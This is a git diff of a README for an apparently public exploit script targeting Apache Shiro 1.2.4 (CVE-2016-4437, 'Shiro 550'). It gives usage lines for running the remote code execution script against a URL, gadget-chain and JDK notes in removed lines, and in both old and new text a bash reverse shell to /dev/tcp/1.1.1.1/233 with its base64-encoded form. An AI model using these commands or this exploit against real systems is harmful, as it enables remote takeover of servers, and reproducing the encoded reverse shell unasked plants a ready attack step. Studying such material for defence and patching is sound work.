@@ -1,51 +1,42 @@
 # Readme
+Apache Shiro 
+
+
+<details>
+<summary>Shiro 1.2.4 [点击展开]</summary>
+<pre><code>
 ```
 +-------------------------------------------------------------------------------------------------------+
 + DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +
 +      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +
 +                                                                                                       +
-+      CommonsCollections1 - commons-collections:3.1  - 3.1-3.2.1, Need <  jdk1.8                       +
-+      CommonsCollections2 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +
-+      CommonsCollections3 - commons-collections:3.1  - 3.1-3.2.1, Need <= jdk7u21                      +
-+      CommonsCollections4 - commons-collections4:4.0 - 4.0,       Need <= jdk7u21                      +
-+      CommonsCollections5 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.8.x                     +
-+      CommonsCollections6 - commons-collections:3.1  - 3.1-3.2.1, Need == jdk1.7 or jdk1.8             +
-+      CommonsCollections7 - 3.1-3.2.1, Need == jdk1.7 or jdk1.8                                        +
-+                                                                                                       +
 +      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +
 +      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +
 +      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +
 +-------------------------------------------------------------------------------------------------------+
-+ USE: python3 <filename> <url> <command>                                                               +
-+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"                                +
++ USE: python3 <filename> <url>                                                                         +
++ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080                                                   +
 + VER: Apahce Shiro <= 1.2.4                                                                            +
 +-------------------------------------------------------------------------------------------------------+
-
 ```
 
-# RCE
-```
-python3 shiro-1.2.4_rce.py http://1.1.1.1:8080 "touch tmp/exphub"
-```
-### Linux Server
-![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/linux-rce.gif)
-
-### Windows Server
-![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/windows-rce.gif)
-
-# Nc Shell
-
-Need encoding
+脚本内置了base64编码，但是仅适配Linux，如果测试Windows手动删除base64加密部分即可  
+也可以前往以下连接手动base64加密  
 http://www.jackson-t.ca/runtime-exec-payloads.html
-
 Original: 
 ```
 bash -i >&/dev/tcp/1.1.1.1/233 0>&1     
 ```
 
-Encoding 
+Encoding：
 ```
 bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}
 ```
 
-![Image](https://github.com/zhzyker/exphub/blob/master/shiro/image/linux-shell.gif)
+利用示例：
+![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/1.gif)
+![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/2.gif)
+
+
+</code></pre>
+</details>
